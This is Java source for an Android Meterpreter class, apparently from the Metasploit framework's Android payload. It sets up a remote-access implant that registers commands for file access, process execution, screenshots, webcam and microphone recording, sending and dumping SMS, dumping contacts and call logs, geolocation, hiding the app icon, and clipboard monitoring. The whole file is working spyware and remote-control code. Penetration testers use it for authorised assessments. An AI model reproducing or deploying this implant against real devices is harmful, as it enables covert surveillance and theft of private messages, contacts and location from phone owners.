package com.metasploit.meterpreter;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;

import com.metasploit.meterpreter.android.stdapi_sys_config_getuid;
import com.metasploit.meterpreter.android.*;
import com.metasploit.meterpreter.android.stdapi_ui_desktop_screenshot;
import com.metasploit.meterpreter.stdapi.*;

import java.io.DataInputStream;
import java.io.File;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class AndroidMeterpreter extends Meterpreter {

    private static final Object contextWaiter = new Object();

    private static String writeableDir;
    private static Context context;

    private final IntervalCollectionManager intervalCollectionManager;
    private ClipManager clipManager;

    private void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context (running as root?)
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    synchronized (contextWaiter) {
                        try {
                            context = (Context) currentApplication.invoke(null, (Object[]) null);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        contextWaiter.notify();
                    }
                }
            });
            synchronized (contextWaiter) {
                if (context == null) {
                    contextWaiter.wait(100);
                }
            }
        }
    }

    public IntervalCollectionManager getIntervalCollectionManager() {
        return this.intervalCollectionManager;
    }

    public synchronized ClipManager getClipManager() {
        if (clipManager == null) {
            clipManager = ClipManager.create(context);
        }
        return clipManager;
    }

    public static Context getContext() {
        return context;
    }

    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, Object[] parameters, boolean redirectErrors) throws Exception {
        super(in, rawOut, true, redirectErrors, false);
        writeableDir = (String)parameters[0];
        byte[] config = (byte[]) parameters[1];
        try {
            findContext();
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (config != null && config[0] != 0) {
            loadConfiguration(in, rawOut, config);
        } else {
            int configLen = in.readInt();
            byte[] configBytes = new byte[configLen];
            in.readFully(configBytes);
            loadConfiguration(in, rawOut, configBytes);
            this.ignoreBlocks = in.readInt();
        }

        this.intervalCollectionManager = new IntervalCollectionManager(getContext());
        this.intervalCollectionManager.start();
        startExecuting();
        this.intervalCollectionManager.stop();
    }

    @Override
    public String[] loadExtension(byte[] data) throws Exception {
        getCommandManager().resetNewCommands();
        CommandManager mgr = getCommandManager();
        Loader.cwd = new File(writeableDir);
        mgr.registerCommand("channel_create_stdapi_fs_file", channel_create_stdapi_fs_file.class);
        mgr.registerCommand("channel_create_stdapi_net_tcp_client", channel_create_stdapi_net_tcp_client.class);
        mgr.registerCommand("channel_create_stdapi_net_tcp_server", channel_create_stdapi_net_tcp_server.class);
        mgr.registerCommand("channel_create_stdapi_net_udp_client", channel_create_stdapi_net_udp_client.class);
        mgr.registerCommand("stdapi_fs_chdir", stdapi_fs_chdir.class);
        mgr.registerCommand("stdapi_fs_delete_dir", stdapi_fs_delete_dir.class);
        mgr.registerCommand("stdapi_fs_delete_file", stdapi_fs_delete_file.class);
        mgr.registerCommand("stdapi_fs_file_expand_path", stdapi_fs_file_expand_path_android.class);
        mgr.registerCommand("stdapi_fs_file_move", stdapi_fs_file_move.class);
        mgr.registerCommand("stdapi_fs_file_copy", stdapi_fs_file_copy.class);
        mgr.registerCommand("stdapi_fs_getwd", stdapi_fs_getwd.class);
        mgr.registerCommand("stdapi_fs_ls", stdapi_fs_ls.class);
        mgr.registerCommand("stdapi_fs_mkdir", stdapi_fs_mkdir.class);
        mgr.registerCommand("stdapi_fs_md5", stdapi_fs_md5.class);
        mgr.registerCommand("stdapi_fs_search", stdapi_fs_search.class);
        mgr.registerCommand("stdapi_fs_separator", stdapi_fs_separator.class);
        mgr.registerCommand("stdapi_fs_stat", stdapi_fs_stat.class);
        mgr.registerCommand("stdapi_fs_sha1", stdapi_fs_sha1.class);
        mgr.registerCommand("stdapi_net_config_get_interfaces", stdapi_net_config_get_interfaces_V1_4.class);
        mgr.registerCommand("stdapi_net_config_get_routes", stdapi_net_config_get_routes_V1_4.class);
        mgr.registerCommand("stdapi_net_socket_tcp_shutdown", stdapi_net_socket_tcp_shutdown_V1_3.class);
        mgr.registerCommand("stdapi_sys_config_getuid", stdapi_sys_config_getuid.class);
        mgr.registerCommand("stdapi_sys_config_sysinfo", stdapi_sys_config_sysinfo_android.class);
        mgr.registerCommand("stdapi_sys_config_localtime", stdapi_sys_config_localtime.class);
        mgr.registerCommand("stdapi_sys_process_execute", stdapi_sys_process_execute_V1_3.class);
        mgr.registerCommand("stdapi_sys_process_get_processes", stdapi_sys_process_get_processes_android.class);
        mgr.registerCommand("stdapi_ui_desktop_screenshot", stdapi_ui_desktop_screenshot.class);
        if (context != null) {
            mgr.registerCommand("webcam_audio_record", webcam_audio_record_android.class);
            mgr.registerCommand("webcam_list", webcam_list_android.class);
            mgr.registerCommand("webcam_start", webcam_start_android.class);
            mgr.registerCommand("webcam_stop", webcam_stop_android.class);
            mgr.registerCommand("webcam_get_frame", webcam_get_frame_android.class);
            mgr.registerCommand("android_send_sms", android_send_sms.class);
            mgr.registerCommand("android_dump_sms", android_dump_sms.class);
            mgr.registerCommand("android_dump_contacts", android_dump_contacts.class);
            mgr.registerCommand("android_dump_calllog", android_dump_calllog.class);
            mgr.registerCommand("android_check_root", android_check_root.class);
            mgr.registerCommand("android_geolocate", android_geolocate.class);
            mgr.registerCommand("android_wlan_geolocate", android_wlan_geolocate.class);
            mgr.registerCommand("android_interval_collect", android_interval_collect.class);
            mgr.registerCommand("android_activity_start", android_activity_start.class);
            mgr.registerCommand("android_hide_app_icon", android_hide_app_icon.class);
            mgr.registerCommand("android_set_audio_mode", android_set_audio_mode.class);
            mgr.registerCommand("android_sqlite_query", android_sqlite_query.class);
            mgr.registerCommand("android_wakelock", android_wakelock.class);
            mgr.registerCommand("android_set_wallpaper", android_set_wallpaper.class);
            mgr.registerCommand("extapi_clipboard_get_data", clipboard_get_data.class);
            mgr.registerCommand("extapi_clipboard_set_data", clipboard_set_data.class);
            mgr.registerCommand("extapi_clipboard_monitor_dump", clipboard_monitor_dump.class);
            mgr.registerCommand("extapi_clipboard_monitor_pause", clipboard_monitor_pause.class);
            mgr.registerCommand("extapi_clipboard_monitor_purge", clipboard_monitor_purge.class);
            mgr.registerCommand("extapi_clipboard_monitor_resume", clipboard_monitor_resume.class);
            mgr.registerCommand("extapi_clipboard_monitor_start", clipboard_monitor_start.class);
            mgr.registerCommand("extapi_clipboard_monitor_stop", clipboard_monitor_stop.class);
        }
        return getCommandManager().getNewCommands();
    }
}

